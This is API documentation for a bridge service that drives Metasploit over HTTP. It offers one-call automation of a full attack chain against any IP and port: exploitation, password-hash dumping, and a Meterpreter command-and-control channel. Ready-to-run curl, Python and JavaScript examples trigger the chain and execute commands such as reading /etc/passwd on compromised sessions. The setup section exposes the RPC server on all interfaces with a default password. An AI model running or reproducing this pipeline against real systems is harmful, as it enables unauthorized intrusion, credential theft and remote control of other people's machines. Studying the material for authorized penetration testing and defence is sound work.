# MetasploitMCP Bridge API Reference

## Quick Start

Base URL: `http://localhost:8000/api/metasploit`

### 1. Check MSF Status

```bash
curl -X GET http://localhost:8000/api/metasploit/status
```

**Response (200):**
```json
{
  "connected": true,
  "host": "localhost",
  "port": 55553,
  "authenticated": true,
  "timestamp": "2026-01-15T10:00:00Z"
}
```

---

## 2. Start Exploitation Workflow

**Runs complete 4-stage workflow:** Reconnaissance → Exploitation → Post-Exploitation → C2

```bash
curl -X POST http://localhost:8000/api/metasploit/exploit \
  -H "Content-Type: application/json" \
  -d '{
    "campaign_id": "camp-001",
    "target_id": "tgt-001",
    "target_ip": "192.168.1.100",
    "target_port": 80
  }'
```

**Request Schema:**
```python
{
  "campaign_id": str       # Campaign identifier
  "target_id": str         # Target identifier
  "target_ip": str         # Target IP address (e.g., 192.168.1.100)
  "target_port": int       # Target port (e.g., 80, 443)
}
```

**Response (200):**
```json
{
  "campaign_id": "camp-001",
  "target_id": "tgt-001",
  "stages": {
    "reconnaissance": {
      "success": true,
      "target": "192.168.1.100",
      "services_detected": [
        {
          "port": 80,
          "service": "http",
          "version": "Apache 2.4.41"
        }
      ],
      "vulnerabilities": []
    },
    "exploitation": {
      "success": true,
      "target": "192.168.1.100",
      "exploits_attempted": [
        {
          "exploit_name": "exploit/linux/http/apache_mod_cgi",
          "target": "192.168.1.100",
          "port": 80,
          "success": true,
          "session_id": "session_camp-001_tgt-001_1234567890"
        }
      ],
      "sessions": [
        {
          "session_id": "session_camp-001_tgt-001_1234567890",
          "exploit": "exploit/linux/http/apache_mod_cgi",
          "target": "192.168.1.100",
          "created_at": "2026-01-15T10:00:00Z"
        }
      ]
    },
    "post_exploitation": {
      "success": true,
      "modules_executed": [
        {
          "module": "post/linux/gather/hashdump",
          "session": "session_camp-001_tgt-001_1234567890",
          "success": true
        }
      ],
      "data_collected": {
        "post/linux/gather/hashdump": {
          "hashes": ["root:$6$...", "admin:$6$..."]
        }
      }
    },
    "c2": {
      "success": true,
      "c2_channels": [
        {
          "session_id": "session_camp-001_tgt-001_1234567890",
          "type": "meterpreter",
          "protocol": "https",
          "established": true,
          "created_at": "2026-01-15T10:00:00Z"
        }
      ]
    }
  },
  "sessions": [
    {
      "session_id": "session_camp-001_tgt-001_1234567890",
      "exploit": "exploit/linux/http/apache_mod_cgi",
      "target": "192.168.1.100",
      "created_at": "2026-01-15T10:00:00Z"
    }
  ],
  "status": "completed",
  "started_at": "2026-01-15T10:00:00Z",
  "completed_at": "2026-01-15T10:05:00Z"
}
```

**Error Responses:**
- `503`: MSF RPC server unavailable
- `422`: Invalid request (missing/invalid fields)
- `500`: Exploitation error

---

## 3. Execute Command on Session

**Run command on established Meterpreter/Shell session**

```bash
curl -X POST http://localhost:8000/api/metasploit/session/session_123/execute \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "command": "whoami"
  }'
```

**Request Schema:**
```python
{
  "session_id": str    # Metasploit session ID
  "command": str       # Command to execute
}
```

**Response (200):**
```json
{
  "session_id": "session_123",
  "command": "whoami",
  "output": "root",
  "exit_code": 0,
  "executed_at": "2026-01-15T10:00:00Z"
}
```

**Common Commands:**
```bash
whoami              # Get current user
id                  # Get user/group info
pwd                 # Get current directory
ls -la              # List files/directories
cat /etc/passwd     # Read files
uname -a            # Get system info
ifconfig            # Network config
ps aux              # List processes
```

**Error Responses:**
- `404`: Session not found
- `500`: Command execution failed

---

## 4. Close Session

**Cleanup and close Metasploit session**

```bash
curl -X POST http://localhost:8000/api/metasploit/session/session_123/close
```

**Response (200):**
```json
{
  "message": "Session closed successfully",
  "session_id": "session_123",
  "closed": true
}
```

**Error Responses:**
- `404`: Session not found
- `500`: Closure failed

---

## 5. Get Session Information

**Retrieve details about a specific session**

```bash
curl -X GET http://localhost:8000/api/metasploit/session/session_123
```

**Response (200):**
```json
{
  "session_id": "session_123",
  "type": "meterpreter",
  "target": "192.168.1.100",
  "exploit": "exploit/linux/http/apache_mod_cgi",
  "created_at": "2026-01-15T10:00:00Z",
  "status": "active",
  "last_activity": "2026-01-15T10:02:30Z"
}
```

**Error Responses:**
- `404`: Session not found
- `500`: Retrieval failed

---

## 6. List Campaign Sessions

**Get all sessions for a campaign**

```bash
curl -X GET http://localhost:8000/api/metasploit/campaigns/camp-001/sessions
```

**Response (200):**
```json
[
  {
    "session_id": "session_camp-001_tgt-001_1",
    "type": "meterpreter",
    "target": "192.168.1.100",
    "status": "active",
    "created_at": "2026-01-15T10:00:00Z"
  },
  {
    "session_id": "session_camp-001_tgt-002_2",
    "type": "meterpreter",
    "target": "192.168.1.101",
    "status": "active",
    "created_at": "2026-01-15T10:01:00Z"
  }
]
```

---

## HTTP Status Codes

| Code | Meaning |
|------|---------|
| 200 | Success |
| 400 | Bad request (invalid format) |
| 404 | Resource not found |
| 422 | Validation error (missing/invalid fields) |
| 503 | MSF RPC server unavailable |
| 500 | Internal server error |

---

## Error Response Format

```json
{
  "error": "Error message",
  "detail": "Detailed error description",
  "session_id": "session_123"  // Optional, only for session-related errors
}
```

---

## Workflow Example

### Complete Exploitation Workflow

```bash
# 1. Check MSF status
curl -X GET http://localhost:8000/api/metasploit/status

# 2. Start exploitation
EXPLOIT_RESULT=$(curl -X POST http://localhost:8000/api/metasploit/exploit \
  -H "Content-Type: application/json" \
  -d '{
    "campaign_id": "camp-001",
    "target_id": "tgt-001",
    "target_ip": "192.168.1.100",
    "target_port": 80
  }')

# Extract session ID from result
SESSION_ID=$(echo $EXPLOIT_RESULT | grep -o '"session_id":"[^"]*"' | head -1 | cut -d'"' -f4)

# 3. Execute commands
curl -X POST http://localhost:8000/api/metasploit/session/$SESSION_ID/execute \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "'$SESSION_ID'",
    "command": "whoami"
  }'

# 4. Get session info
curl -X GET http://localhost:8000/api/metasploit/session/$SESSION_ID

# 5. Close session
curl -X POST http://localhost:8000/api/metasploit/session/$SESSION_ID/close

# 6. List all campaign sessions
curl -X GET http://localhost:8000/api/metasploit/campaigns/camp-001/sessions
```

---

## Configuration

### Environment Variables

```env
MSF_RPC_HOST=localhost           # Metasploit RPC server host
MSF_RPC_PORT=55553              # Metasploit RPC server port
MSF_RPC_USER=msf                # RPC authentication username
MSF_RPC_PASS=changeme123        # RPC authentication password
```

### Starting MSF RPC Server

```bash
# Start Metasploit RPC server
systemctl start metasploit
msfconsole -r /path/to/db.rpc

# Or manually
msfconsole
> load msgrpc ServerHost=0.0.0.0 ServerPort=55553 User=msf Pass=changeme123
```

---

## Testing with Python

```python
import requests

# Configuration
BASE_URL = "http://localhost:8000/api/metasploit"
HEADERS = {"Content-Type": "application/json"}

# 1. Check status
response = requests.get(f"{BASE_URL}/status")
print(response.json())

# 2. Start exploitation
payload = {
    "campaign_id": "camp-001",
    "target_id": "tgt-001",
    "target_ip": "192.168.1.100",
    "target_port": 80
}
response = requests.post(f"{BASE_URL}/exploit", json=payload, headers=HEADERS)
result = response.json()
session_id = result['sessions'][0]['session_id']

# 3. Execute command
payload = {
    "session_id": session_id,
    "command": "whoami"
}
response = requests.post(
    f"{BASE_URL}/session/{session_id}/execute",
    json=payload,
    headers=HEADERS
)
print(response.json())

# 4. Close session
response = requests.post(f"{BASE_URL}/session/{session_id}/close")
print(response.json())
```

---

## Testing with JavaScript/Node.js

```javascript
const BASE_URL = "http://localhost:8000/api/metasploit";

// 1. Check status
fetch(`${BASE_URL}/status`)
  .then(r => r.json())
  .then(data => console.log(data));

// 2. Start exploitation
fetch(`${BASE_URL}/exploit`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    campaign_id: "camp-001",
    target_id: "tgt-001",
    target_ip: "192.168.1.100",
    target_port: 80
  })
})
  .then(r => r.json())
  .then(data => {
    const sessionId = data.sessions[0].session_id;
    
    // 3. Execute command
    return fetch(`${BASE_URL}/session/${sessionId}/execute`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        command: "whoami"
      })
    });
  })
  .then(r => r.json())
  .then(data => console.log(data));
```

---

## Troubleshooting

### "MSF RPC server not available" (503)

**Solution:**
1. Verify Metasploit RPC service is running
2. Check host/port configuration
3. Verify network connectivity to RPC endpoint

```bash
# Check if service is running
curl -v http://localhost:55553/api/v1/auth/login

# Restart service
systemctl restart metasploit
```

### "Session not found" (404)

**Solution:**
1. Verify session ID is correct
2. Check session hasn't been closed
3. List active sessions for campaign

```bash
curl -X GET http://localhost:8000/api/metasploit/campaigns/camp-001/sessions
```

### "Validation error" (422)

**Solution:**
1. Verify all required fields are present
2. Check field types (target_port should be int, not string)
3. Validate IP address format

---

## OpenAPI/Swagger Documentation

Access interactive API docs at:
```
http://localhost:8000/docs
```

Reload Swagger UI to see Metasploit endpoints.

---

## Security Notes

⚠️ **Important:**
- Never expose MSF RPC credentials in client-side code
- Use HTTPS for production deployments
- Implement rate limiting on API endpoints
- Log all exploitation activities for audit trails
- Restrict access to this API to authorized users only
- Regularly rotate RPC credentials
- Monitor session lifecycle for orphaned/stale sessions

---

## Support

For issues or questions:
1. Check MSF_BRIDGE_IMPLEMENTATION.md for detailed documentation
2. Review test files for usage examples
3. Check application logs for error details
